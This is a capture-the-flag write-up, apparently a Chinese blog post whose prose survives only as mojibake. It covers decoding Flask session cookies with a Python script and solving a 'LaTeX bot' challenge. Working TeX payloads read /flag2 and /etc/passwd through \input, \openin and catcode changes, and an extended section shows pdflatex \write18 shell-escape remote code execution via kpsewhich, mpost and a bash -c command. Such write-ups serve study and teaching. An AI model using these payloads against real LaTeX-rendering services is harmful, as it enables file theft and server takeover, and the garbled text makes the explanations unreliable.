</h3><p>ç”±äºflaskæ˜¯å¾ˆè½»é‡çº§çš„æ¡†æ¶ï¼Œä¸€èˆ¬ä¸ºç¡®ä¿å®‰å…¨sessionéƒ½æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯çš„ï¼ŒflaskæŠŠsessionæ”¾åœ¨å®¢æˆ·ç«¯çš„cookieï¼Œç™»å½•æˆåŠŸçš„cookieå¯ä»¥èµ‹å€¼ä¸‹æ¥è§£å¯†ã€‚</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029193635-f1d314f8-577d-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029193635-f1d314f8-577d-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¥è‡ªPç¥çš„è„šæœ¬å’Œéƒ¨åˆ†è§£æåŸç†</p><p>æ‰€ä»¥è§£å¯†è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è„šæœ¬ä½¿ç”¨ï¼šè§£å¯†ï¼š<code>python 1.py decode -c &quot;è§£å¯†session&quot;</code></p><p><strong>sessionè§£æåŸç†</strong>ï¼š<br>    è®¿é—®çš„sessionå˜é‡æ˜¯RequestContextå®ä¾‹çš„å˜é‡ã€‚åœ¨RequestContext.Push()æœ€åæœ‰å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.session = self.app.open_session(self.request)</span><br><span class="line"><span class="keyword">if</span> self.session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">self.session = self.app.make_null_session()</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç åˆå§‹åŒ–sessionå¹¶ä¿å­˜åœ¨RequestContextä¸Šåç»­å°±èƒ½ç›´æ¥from flask import sessionä½¿ç”¨ã€‚ä½†æ˜¯<strong>æ²¡è®¾ç½®secret_keyå˜é‡çš„è¯ï¼Œopen_sessionä¼šè¿”å›None</strong>ï¼Œè¿™æ ·è°ƒç”¨make_null_sessionå°±ä¼šè·å–ç©ºsessionã€‚<br>åœ¨è·å–cookieçš„è¿‡ç¨‹ä¸­</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = self.get_signing_serializer(app)</span><br><span class="line">val = request.cookies.get(app.session_cookie_name)</span><br><span class="line">data = s.loads(val,max_age=max_age)</span><br></pre></td></tr></table></figure><p><code>signing_serializer</code>èƒ½ç¡®ä¿cookieå’Œsessionç›¸äº’è½¬æ¢çš„å®‰å…¨é—®é¢˜ã€‚è€Œget_sigining_serializeræ–¹æ³•ä¼šç”¨åˆ°secret_key,saltç›å€¼,åºåˆ—ç®—æ³•å’Œhash(sha1)ã€ç­¾åç®—æ³•(hmac)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_signing_serializer</span>(<span class="params">self, app</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    signer_kwargs = <span class="built_in">dict</span>(</span><br><span class="line">        key_derivation=self.key_derivation,</span><br><span class="line">        digest_method=self.digest_method</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> URLSafeTimedSerializer(app.secret_key,</span><br><span class="line">        salt=self.salt,</span><br><span class="line">        serializer=self.serializer,</span><br><span class="line">        signer_kwargs=signer_kwargs)</span><br></pre></td></tr></table></figure><p>è€Œsessionå¯ä»¥è¿›è¡Œæ‰‹åŠ¨è§£æï¼Œsessionä¸€èˆ¬æœ‰ä¸¤ä¸ªå¥å·åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œæ‰€ä»¥è¦rsplitä¸¤ä¸ªâ€™.â€™ï¼Œ<strong>ç¬¬ä¸€éƒ¨åˆ†ä¸ºbase64åŠ å¯†æ•°æ®ï¼Œç¬¬äºŒéƒ¨åˆ†ä¸ºæ—¶é—´æˆ³ï¼Œç¬¬ä¸‰éƒ¨åˆ†ä¸ºæ ¡éªŒä¿¡æ¯token</strong>ï¼Œé¡ºåºå¯æ‰“ä¹±ã€‚è§£å¯†çš„è¯å°±æ˜¯æ•´ä¸ªzlib.decompressè¿›è¡Œæ•°æ®è§£å‹ï¼Œç„¶åå•ç‹¬å¯¹æ•°æ®base64è§£å¯†</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029193904-4aac123c-577e-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029193904-4aac123c-577e-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¯”å¦‚éšæœºæˆªå–ä¸€ä¸ªset-cookieè§£å¯†<br>åŸsession:<br><code>.eJwVUElPQmEM_C_v6kv8urcmHhDR4IaAROVGCCJLeAcfihj_u_XSTKfT6fJTtYtDW51VoGqFRJnMWAOYtUYGUoqCpEgYAa4SHFZY2cKC0AxMalRyBBcsVpxZACkEqSRyZPfMMsc6GSCINPEgcMasBhdEMkJnVScuAbVqMVdKztE0h1iKicXYyPB_z1KCag1hdYCA3FY0JZ5HJBDKawQjA3kNEe4amPIwJUwfQc2u1DOpeYhw0aqu2maz2OUvyDTO7nuTbn94eTisWTvr8dQ7j3tflmkj3N6tZ5Pbz3l33My2p8fBUoZyMhr2l6Pp5ri8oH3z8rQa3awGm21vUN7h8N2_upYy3O30g5-_Ht7mr35e_f4BNo5cEw.Y1zx-w.AKWqqvzk3yGcqLTpVu0KUAlltZU</code><br>è§£å‡ºæ¥æ˜¯å¦‚ä¸‹æ ¼å¼ï¼š<br><code>&#123;&#39;text&#39;: &#39;1667035643774691446,241363902362329918659497046479793277175,263821852070844512395230451824883959522,304131965989318428249402237328466834091,66078633288276277718434574737267030093,69546811911445684386675685316652966538,199886926959763245752619143843678955406&#39;, &#39;token&#39;: &#39;3769:MEUCIQDxxj46AjSZ8APu8g0Zo54tLjaUKvcCSoal/zOg5Q5+RQIgRZkzgB3uoXTiRJiOklEO0h1xyIFG50Qnn6s4WwNfcY8=&#39;&#125;</code></p><p>å¯ä»¥çœ‹åˆ°æ•°æ®éƒ¨åˆ†å’Œä¸‹å›¾ä¸€æ ·ã€‚è€Œ1667035643774691446ä¸ºçº³ç§’çº§æ—¶é—´æˆ³ï¼Œtokenå€¼ä¸å˜<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221029201423-39b7d97a-5783-1.png" class="lazyload placeholder" data-srcset="https://xzfile.aliyuncs.com/media/upload/picture/20221029201423-39b7d97a-5783-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯è¦ä¼ªé€ è¿˜éœ€è¦çŸ¥é“secret_keyã€‚æ‰€ä»¥æ²¡åŠæ³•è§£</p><h2 id="LaTeX-æœºå™¨äºº"><a href="#LaTeX-æœºå™¨äºº" class="headerlink" title="LaTeX æœºå™¨äºº"></a>LaTeX æœºå™¨äºº</h2><blockquote><p>åœ¨ç½‘ä¸Šç¤¾äº¤ç¾¤ç»„ä¸­äº¤æµæ•°å­¦å’Œç‰©ç†é—®é¢˜æ—¶ï¼Œæ€»æ˜¯å…ä¸äº†è¾“å…¥å…¬å¼ã€‚è€Œæ˜¾ç„¶å¤§å¤šæ•°å¸¸ç”¨çš„èŠå¤©è½¯ä»¶å¹¶ä¸èƒ½åšåˆ°è¿™ä¸€ç‚¹ã€‚ä¸ºäº†æ–¹ä¾¿å¤§å®¶åœ¨æ°´ç¾¤å’Œå–å¼±ä¹‹ä½™èƒ½å¤Ÿé«˜æ•ˆåœ°è¿›è¡Œå­¦æœ¯äº¤æµï¼ŒG ç¤¾çš„åŒå­¦åˆ¶ä½œäº†ä¸€ä¸ªç®€å•æ˜“ç”¨çš„å°† LaTeX å…¬å¼ä»£ç è½¬æ¢æˆå›¾ç‰‡çš„ç½‘ç«™ï¼Œå¹¶é€šè¿‡èŠå¤©æœºå™¨äººåœ¨ç¾¤é‡Œå®æ—¶å°†ç¾¤å‹å‘é€çš„å…¬å¼è½¬æ¢æˆå›¾ç‰‡å‘å‡ºã€‚<br>è¿™ä¸ªç½‘ç«™çš„æ€è·¯ä¹Ÿå¾ˆç›´æ¥ï¼šæŠŠç”¨æˆ·è¾“å…¥çš„ LaTeX æ’å…¥åˆ°ä¸€ä¸ªå†™å¥½å¤´éƒ¨å’Œå°¾éƒ¨çš„ TeX æ–‡ä»¶ä¸­ï¼Œå°†æ–‡ä»¶ç¼–è¯‘æˆ PDFï¼Œå†å°† PDF è£å‰ªæˆå¤§å°åˆé€‚çš„å›¾ç‰‡ã€‚<br>â€œLaTeX åˆä¸æ˜¯è¢«ç¼–è¯‘æ‰§è¡Œçš„ä»£ç ï¼Œè¿™ç§ä¸œè¥¿ä¸ä¼šæœ‰äº‹çš„ã€‚â€<br>ç‰©ç†å‡ºèº«çš„å¼€å‘è€…ä»¬æ˜æ˜¾ä¸æ˜¯å¤ªåœ¨æ„è¿™ä¸ªç½‘ç«™çš„å®‰å…¨é—®é¢˜ï¼Œä¹Ÿæ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥åšä»»ä½•æ£€æŸ¥ã€‚<br>é‚£ä½ èƒ½æƒ³åŠæ³•è·å¾—æœåŠ¡å™¨ä¸Šæ”¾åœ¨æ ¹ç›®å½•ä¸‹çš„ flag å—ï¼Ÿ<br><strong>çº¯æ–‡æœ¬</strong><br>ç¬¬ä¸€ä¸ª flag ä½äº <code>/flag1</code>ï¼Œflag èŠ±æ‹¬å·å†…çš„å†…å®¹ç”±çº¯æ–‡æœ¬ç»„æˆï¼ˆå³åªåŒ…å«å¤§å†™å°å†™å­—æ¯å’Œæ•°å­— 0-9ï¼‰ã€‚<br><strong>ç‰¹æ®Šå­—ç¬¦æ··å…¥</strong><br>ç¬¬äºŒä¸ª flag ä½äº <code>/flag2</code>ï¼Œè¿™æ¬¡ï¼Œflag èŠ±æ‹¬å·å†…çš„å†…å®¹é™¤äº†å­—æ¯å’Œæ•°å­—ä¹‹å¤–ï¼Œè¿˜æ··å…¥äº†ä¸¤ç§ç‰¹æ®Šå­—ç¬¦ï¼šä¸‹åˆ’çº¿ï¼ˆ<code>_</code>ï¼‰å’Œäº•å·ï¼ˆ<code>#</code>ï¼‰ã€‚ä½ å¯èƒ½éœ€è¦æƒ³äº›å…¶ä»–åŠæ³•äº†ã€‚</p></blockquote><p>â€‹ä»æ–‡ä»¶ç³»ç»Ÿè¯»å–ä»»æ„æ–‡ä»¶å¯ä»¥ç”¨\input</p><p><code>\input\&#123;/etc/passwd&#125;</code></p><p>è¯¥å‘½ä»¤è¯»å–&#x2F;etc&#x2F;passwdå†™å…¥åˆ°PDFæ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶æ—¶texï¼Œå¯ä»¥ç”¨\include{}è¯»å–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030220109665.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030220109665.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">\newread</span><span class="keyword">\file</span></span><br><span class="line"><span class="keyword">\openin</span><span class="keyword">\file</span>=&quot;/flag2&quot;</span><br><span class="line"><span class="keyword">\loop</span><span class="keyword">\unless</span><span class="keyword">\ifeof</span><span class="keyword">\file</span></span><br><span class="line">    <span class="keyword">\read</span><span class="keyword">\file</span> to<span class="keyword">\fileline</span> </span><br><span class="line">    <span class="keyword">\fileline</span></span><br><span class="line"><span class="keyword">\repeat</span></span><br><span class="line"><span class="keyword">\closein</span><span class="keyword">\file</span> </span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç åˆ›å»ºä¸€ä¸ª\fileæ–‡ä»¶å¯¹è±¡ï¼Œæ‰“å¼€&#x2F;flag2ç”¨\loopå¾ªç¯è¿›è¡Œè¯»å–åˆ°\filelineå˜é‡è¾“å‡º</p><p>â‘ ç”±äºä¸èƒ½å†å‚ç›´æ¨¡å¼ä¸‹ä½¿ç”¨å®å‚æ•°å­—ç¬¦â€#â€ï¼Œä½†æ˜¯å¯ä»¥æŠŠå®ƒå»æ‰åŠŸèƒ½è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è½¬åŒ–ä¸ºå­—ç¬¦ï¼Œä¸‹åˆ’çº¿ä¹Ÿæ˜¯åŒç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\catcode`\#=11</span><br><span class="line">\catcode`\_=11</span><br></pre></td></tr></table></figure><p>11ä»£è¡¨å­—æ¯ã€‚TeXçš„ç±»åˆ«ä»£ç å¦‚ä¸‹ï¼š</p><ul><li>0 &#x3D; è½¬ä¹‰å­—ç¬¦ï¼Œé€šå¸¸æ˜¯ \</li><li>1 &#x3D; å¼€å§‹åˆ†ç»„ï¼Œé€šå¸¸æ˜¯ {</li><li>2 &#x3D; ç»“æŸåˆ†ç»„ï¼Œé€šå¸¸ }</li><li>3 &#x3D; æ•°å­¦ç§»ä½ï¼Œé€šå¸¸ä¸º $</li><li>4 &#x3D; å¯¹é½é€‰é¡¹å¡ï¼Œé€šå¸¸ &amp;</li><li>5 &#x3D; è¡Œå°¾ï¼Œé€šå¸¸ <return></li><li>6 &#x3D; å‚æ•°ï¼Œé€šå¸¸ #</li><li>7 &#x3D; ä¸Šæ ‡ï¼Œé€šå¸¸ ^</li><li>8 &#x3D; ä¸‹æ ‡ï¼Œé€šå¸¸ä¸º _</li><li>9 &#x3D; å¿½ç•¥çš„å­—ç¬¦ï¼Œé€šå¸¸æ˜¯ <null></li><li>10 &#x3D; ç©ºæ ¼ï¼Œé€šå¸¸æ˜¯ <space> å’Œ <tab></li><li>11 &#x3D; å­—æ¯ï¼Œé€šå¸¸åªåŒ…å«å­—æ¯ a,â€¦,z å’Œ A,â€¦,Zã€‚è¿™äº›å­—ç¬¦å¯ç”¨äºå‘½ä»¤åç§°</li><li>12 &#x3D; å…¶ä»–ï¼Œé€šå¸¸æœªåœ¨å…¶ä»–ç±»åˆ«ä¸­åˆ—å‡ºçš„æ‰€æœ‰å…¶ä»–å†…å®¹</li><li>13 &#x3D; æ´»åŠ¨è§’è‰²ï¼Œä¾‹å¦‚ ~</li><li>14 &#x3D; æ³¨é‡Šå­—ç¬¦ï¼Œé€šå¸¸ä¸º %</li><li>15 &#x3D; æ— æ•ˆå­—ç¬¦ï¼Œé€šå¸¸æ˜¯ <delete></li></ul><p>payloadå¦‚ä¸‹ï¼š(ä¸éœ€è¦è¿›è¡Œå¾ªç¯ï¼Œåªæœ‰ä¸€è¡Œæ˜¯ä¸è¡Œçš„æ)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\newread\file </span><br><span class="line">\openin\file=/flag2 </span><br><span class="line">\catcode`\#=11 </span><br><span class="line">\catcode`\_=11 </span><br><span class="line">\read\file to\line </span><br><span class="line">\line </span><br><span class="line">\closein\file</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030222037514.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030222037514.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>â‘¡åƒperlè„šæœ¬ä¸€æ ·ç¦ç”¨æ§åˆ¶å­—ç¬¦ã€‚è¿™æ ·å°±èƒ½inputåŒ…å«$#_&amp;ç©ºå­—èŠ‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \catcode `\$=12 \catcode `\#=12 \catcode `\_=12 \catcode `\&amp;=12 \input&#123;/flag2&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030223526401.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030223526401.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶ä¸­å•ç‚¹ä¸ºä¸‹åˆ’çº¿</p><p>â‘¢åˆ©ç”¨verbatiminputï¼Œmcfxå¤§ä½¬ç”¨çš„æ‰‹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$$ \makeatletter</span><br><span class="line">è¿™é‡Œæ”¾ verbatim.sty çš„å†…å®¹ï¼Œè®°å¾—åˆ æ‰è¡Œæœ«çš„ %</span><br><span class="line">\makeatother</span><br><span class="line">\verbatiminput&#123;/flag2&#125; $$</span><br></pre></td></tr></table></figure><h3 id="æ‰©å±•çŸ¥è¯†ï¼šå¯¹-inputå’Œ-write18åŸè¯­è§£æï¼Œä»¥åŠpdflatexå¯¼è‡´çš„RCE"><a href="#æ‰©å±•çŸ¥è¯†ï¼šå¯¹-inputå’Œ-write18åŸè¯­è§£æï¼Œä»¥åŠpdflatexå¯¼è‡´çš„RCE" class="headerlink" title="æ‰©å±•çŸ¥è¯†ï¼šå¯¹\inputå’Œ\write18åŸè¯­è§£æï¼Œä»¥åŠpdflatexå¯¼è‡´çš„RCE"></a>æ‰©å±•çŸ¥è¯†ï¼šå¯¹\inputå’Œ\write18åŸè¯­è§£æï¼Œä»¥åŠpdflatexå¯¼è‡´çš„RCE</h3><p>å…³äºLateXæ‰¾åˆ°ç›¸å…³æ–‡çŒ®hacking with LaTexã€‚pdfLateXæ”¯æŒè¯»å†™æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥æœ‰å¯èƒ½å­˜åœ¨rceå’Œæ–‡ä»¶ä¸Šä¼ å’ŒåŒ…å«ã€‚</p><p>æ¥è‡ªäºinfosecwiteupsçš„ä½œè€…åˆ©ç”¨LateXè¿›è¡ŒRCEçš„è¿‡ç¨‹ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030210722860.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030210722860.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸‹åˆ—TeXåŸè¯­å°†å‘½ä»¤å‘é€åˆ°shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\immediate\write18&#123;bibtex8 --wolfgang \jobname&#125;</span><br><span class="line">\input&#123;|bibtex8 --wolfgang \jobname&#125;</span><br></pre></td></tr></table></figure><p>åœ¨Ubuntu16.04ï¼Œ<code>/usr/share/texmf/wb2c/texmf.cnf</code>é…ç½®æ–‡ä»¶æ§åˆ¶pdflatex()çš„è¡Œä¸ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">% Enable system commands via \write18&#123;...&#125;.  When enabled fully (set to</span><br><span class="line">% t), obviously insecure.  When enabled partially (set to p), only the</span><br><span class="line">% commands listed in shell_escape_commands are allowed.  Although this</span><br><span class="line">% is not fully secure either, it is much better, and so useful that we</span><br><span class="line">% enable it for everything but bare tex.</span><br><span class="line">shell_escape = p</span><br><span class="line"></span><br><span class="line">% No spaces in this command list.</span><br><span class="line">%</span><br><span class="line">% The programs listed here are as safe as any we know: they either do</span><br><span class="line">% not write any output files, respect openout_any, or have hard-coded</span><br><span class="line">% restrictions similar or higher to openout_any=p.  They also have no</span><br><span class="line">% features to invoke arbitrary other programs, and no known exploitable</span><br><span class="line">% bugs.  All to the best of our knowledge.  They also have practical use</span><br><span class="line">% for being called from TeX.</span><br><span class="line">%</span><br><span class="line">shell_escape_commands = \</span><br><span class="line">bibtex,bibtex8,\</span><br><span class="line">extractbb,\</span><br><span class="line">kpsewhich,\</span><br><span class="line">makeindex,\</span><br><span class="line">mpost,\</span><br><span class="line">repstopdf,\</span><br></pre></td></tr></table></figure><p>æ³¨æ„shell_escape_commandsï¼Œè¯¥å‘½ä»¤èƒ½ç›´æ¥è¿›è¡ŒRCEã€‚åˆ›å»ºä¸€ä¸ªç®€å•texæ–‡ä»¶ç”¨äºæµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">\immediate\write18&#123;uname -a&#125;</span><br><span class="line">\end&#123;document&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212742156.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212742156.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åªè¦èƒ½å®ç°uname -aå³å¯rceï¼Œç”¨straceç¼–è¯‘å¦‚ä¸‹</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212832603.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030212832603.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>uname -aæ²¡æœ‰è¢«ç¦ï¼Œå°†unameæ¢ä¸ºkpsewhichæœç´¢ç³»ç»Ÿæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/uname -a/kpsewhich --imminent --pwn&#x27; x.tex</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -ff -e execve pdflatex x.tex</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213249569.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213249569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚å›¾ï¼ŒæˆåŠŸæ‰§è¡Œï¼Œshell_escape_commandsåˆ—è¡¨çš„ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶éƒ½èƒ½æ‰§è¡Œã€‚æ³¨æ„ä¸€å®šè¦åœ¨åˆ—è¡¨å†…ã€‚</p><p>mpæ–‡ä»¶(metapost)ä¹Ÿèƒ½è¿›è¡ŒRCEã€‚x.mpä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">verbatimtex</span><br><span class="line">\documentclass&#123;minimal&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">etex</span><br><span class="line">beginfig (1)</span><br><span class="line">label(btex blah etex, origin);</span><br><span class="line">endfig;</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>echo x.mp |  strace -ff -e execve mpost -ini -tex=&quot;/bin/uname -a&quot;</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213949751.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030213949751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼å¾ˆç®€å•ï¼Œä½†æ˜¯ä¼ é€’å‚æ•°æ¯”è¾ƒéš¾ï¼Œå¯ä»¥ç”¨bashç›´æ¥RCE</p><p><code>bash -c &#39;(id;uname$&#123;IFS&#125;-sm)&gt;/tmp/pwn(æœ¬åœ°)&#39;</code>å†™å…¥åˆ°x.tex</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030214842464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030214842464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†™å…¥æˆåŠŸï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030215200986.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221030215200986.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>äº‹å®ä¸ŠPOCéœ€è¦å†™åˆ°pdflatexç›®å½•ä¸‹ï¼Œå¦‚æœä¸åœ¨çš„è¯éœ€è¦æŒ‡å®šx.mpé»˜è®¤æ–‡ä»¶ã€‚-interaction&#x3D;nonstomode 